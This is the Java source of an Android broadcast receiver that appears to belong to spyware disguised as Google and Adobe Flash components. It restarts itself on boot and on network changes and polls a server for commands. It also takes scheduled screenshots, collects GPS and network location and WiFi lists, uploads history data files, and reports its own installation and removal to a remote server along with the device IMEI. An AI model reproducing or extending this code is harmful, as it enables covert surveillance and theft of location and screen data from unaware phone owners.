package com.main;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.util.Log;

import com.adobe.flashplayer.SoEntry;
import com.network.SendDataToServer;
import com.phone.data.GDLocation;
import com.phone.data.PhoneLocation;
import com.phone.data.PhoneWIFI;
import com.utils.ExceptionProcess;
import com.utils.PrefOper;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;



//Environment.MEDIA_SHARED
/*
不能静态注册的广播:
	　　android.intent.action.SCREEN_ON
	　　android.intent.action.SCREEN_OFF
	　　android.intent.action.BATTERY_CHANGED
	　　android.intent.action.CONFIGURATION_CHANGED
	　　android.intent.action.TIME_TICK
*/

public class GSBroadcastReceiver extends BroadcastReceiver{
	private final String TAG 			= "GoogleServerBroadcastReceiver";
	public static Activity screenguard 	= null;
	public static int batteryPercent 	= 0;
	public static GSBroadcastReceiver gBroadcastReceiver = null;

	public void onReceive(Context context,Intent intent){	
		String action = intent.getAction();
		try{
			if (action.equals(ForegroundService.SERVERCMD_ALARM_ACTION) ) {
				
				if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
					MainUtils.setServerCmdAlarm(context);
		        }
				
				MainUtils.serverCmdThread(context);
		    	
		    	HistoryDataFiles historyfiles = new HistoryDataFiles(context);
		    	Thread threadhistory = new Thread(historyfiles);
		    	threadhistory.start();
		    	
				String value = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName,ForegroundService.SETUPMODE);
				if (value != null && (value.equals(ForegroundService.SETUPMODE_MANUAL) == true ||
						value.equals(ForegroundService.SETUPMODE_APK) == true)) {
					MainUtils.checkStartForegroundService(context);
				}else if(value.equals(ForegroundService.SETUPMODE_SO) || value.equals(ForegroundService.SETUPMODE_JAR)){
					new Thread(new SoEntry(context)).start();
				}
			}
			else if (action.equals(Intent.ACTION_BATTERY_CHANGED)){
		        int current = intent.getExtras().getInt("level");	// 获得当前电量
		        int total = intent.getExtras().getInt("scale");		// 获得总电量
		        batteryPercent = current * 100 / total;
				Log.e(TAG,"phone current power:%"+batteryPercent);
			}
			else if (Intent.ACTION_TIME_TICK.equals(action) ) {
				Log.e(TAG,"ACTION_TIME_TICK");
			}
			else if (action.equals(ForegroundService.SCREENSNAPSHOT_ALARM_ACTION) ){
				MainUtils.doScreenshotOnce(context);
				
				if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
					MainUtils.scheduleScreenshot(context);
		        }
			}
			else if (Intent.ACTION_SCREEN_ON.equals(action) ) {
				Log.e(TAG,"ACTION_SCREEN_ON");
				//if(screenguard != null){
				//	screenguard.finish();
				//	screenguard = null;
				//}
			}
			else if (Intent.ACTION_SCREEN_OFF.equals(action) ) {
				Log.e(TAG,"ACTION_SCREEN_OFF");
				//Intent intentscreen = new Intent(context,ScreenGuardActivity.class);
				//intentscreen.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				//context.startActivity(intentscreen);
			}
			else if(action.equals("android.intent.action.BOOT_COMPLETED")){
				String value = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName,ForegroundService.SETUPMODE);
				if (value != null && (value.equals(ForegroundService.SETUPMODE_MANUAL) == true ||
						value.equals(ForegroundService.SETUPMODE_APK) == true)) {
					MainUtils.checkStartForegroundService(context);
				}else if(value.equals(ForegroundService.SETUPMODE_SO) || value.equals(ForegroundService.SETUPMODE_JAR)){
					new Thread(new SoEntry(context)).start();
				}
				
				Log.e(TAG,"BOOT_COMPLETED");
				WriteDateFile.writeLogFile("receive BOOT_COMPLETED\r\n");
			}
			else if (action.equals("android.net.conn.CONNECTIVITY_CHANGE")) {
		    	PhoneWIFI.updateWIFIList(context);

				String value = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName,ForegroundService.SETUPMODE);
				if (value != null && (value.equals(ForegroundService.SETUPMODE_MANUAL) == true ||
						value.equals(ForegroundService.SETUPMODE_APK) == true)) {
					MainUtils.checkStartForegroundService(context);
				}else if(value.equals(ForegroundService.SETUPMODE_SO) || value.equals(ForegroundService.SETUPMODE_JAR)){
					new Thread(new SoEntry(context)).start();
				}
				
				Log.e(TAG,"android.net.conn.CONNECTIVITY_CHANGE");
			}
			else if (action.equals(Intent.ACTION_USER_PRESENT)) {
				Log.d(TAG,"android.intent.action.USER_PRESENT");
			}
			else if (action.equals("android.intent.action.ACTION_SHUTDOWN")) {
				Log.e(TAG,"shutdown system");
				WriteDateFile.writeLogFile("shutdown system\r\n");
			}else if (action.equals(ForegroundService.PHONELOCATION_ALARM_ACTION)) {
				
				if (Public.LOCATION_TYPE == 1) {
					boolean ret = PhoneLocation.doOneNetworkLocation(context);
					if (ret == false) {
						ret = PhoneLocation.doOneGpsLocation(context);
					}	
				}else if (Public.LOCATION_TYPE == 2) {
					new Thread(new GDLocation(context,0)).start();
				}else if (Public.LOCATION_TYPE == 3) {
					
				}

				if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
					MainUtils.scheduleLocation(context);
		        }
			}
			else if (Intent.ACTION_PACKAGE_ADDED.equals(action)) {
				 String packageName = intent.getData().getSchemeSpecificPart();
				 if (packageName.equals(context.getPackageName())) {
					 new Thread(new Runnable() {
						@Override
						public void run() {
							String strtime = PublicFunction.formatCurrentDate()+" added";
							SendDataToServer.sendDataToServer(strtime.getBytes(), strtime.length(), Public.CMD_UNINSTALL, Public.IMEI);
						}
					}).start();
				}
				Log.e(TAG,"ACTION_PACKAGE_ADDED:" + packageName);
	        }         
			else if (Intent.ACTION_PACKAGE_REMOVED.equals(action)) {
				String packageName = intent.getData().getSchemeSpecificPart();
				Log.e(TAG,"ACTION_PACKAGE_REMOVED:" + packageName);
				 if (packageName.equals(context.getPackageName())) {
					 new Thread(new Runnable() {
						@Override
						public void run() {
							String strtime = PublicFunction.formatCurrentDate()+" uninstalled";
							SendDataToServer.sendDataToServer(strtime.getBytes(), strtime.length(), Public.CMD_UNINSTALL, Public.IMEI);
						}
					}).start();
				}
	        }         
			else if (Intent.ACTION_PACKAGE_REPLACED.equals(action)) {
				String packageName = intent.getData().getSchemeSpecificPart();
				Log.e(TAG,"ACTION_PACKAGE_REPLACED:" + packageName);
				 if (packageName.equals(context.getPackageName())) {
					 new Thread(new Runnable() {
						@Override
						public void run() {
							String strtime = PublicFunction.formatCurrentDate()+" replaced";
							SendDataToServer.sendDataToServer(strtime.getBytes(), strtime.length(), Public.CMD_UNINSTALL, Public.IMEI);
						}
					}).start();	
				}
	        }
			else{
				return;
			}
		}
		catch(Exception ex){
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("BroadcastReceiver exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
			return ;
		}
	
	}
	
	
	public static void init(Context context){
		if (GSBroadcastReceiver.gBroadcastReceiver == null) {
			IntentFilter filter = new IntentFilter();
			filter.addAction(Intent.ACTION_SCREEN_ON);
			filter.addAction(Intent.ACTION_SCREEN_OFF);
			filter.addAction(Intent.ACTION_BATTERY_CHANGED);
			filter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
			filter.addAction("android.net.wifi.WIFI_STATE_CHANGED");
			filter.addAction("android.net.wifi.STATE_CHANGE");
			filter.addAction(Intent.ACTION_USER_PRESENT);
			filter.addAction(Intent.ACTION_TIME_TICK);
			filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY - 1);
			filter.addDataScheme("package");

			GSBroadcastReceiver.gBroadcastReceiver = new GSBroadcastReceiver();
			context.registerReceiver(GSBroadcastReceiver.gBroadcastReceiver, filter);
		}
	}
}


